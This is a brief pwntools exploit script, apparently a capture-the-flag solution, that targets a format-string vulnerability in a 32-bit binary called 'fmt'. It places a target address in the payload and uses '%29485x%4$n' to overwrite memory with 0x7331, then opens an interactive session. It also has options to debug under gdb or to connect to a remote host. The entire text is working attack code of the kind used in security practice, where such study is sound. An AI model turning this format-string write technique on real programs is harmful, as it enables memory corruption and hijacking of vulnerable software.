from pwn import *
from sys import *

context.clear(arch='i386')

elf = ELF('fmt')
p = process('./fmt')

cmd = """
b*0x0804936e
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

target = 0x0804c02c

#payload = fmtstr_payload(4,{target:0x7331},write_size='short')
payload = p32(target)
payload += b"%29485x"
payload += b"%4$n"
p.sendline(payload)
p.interactive()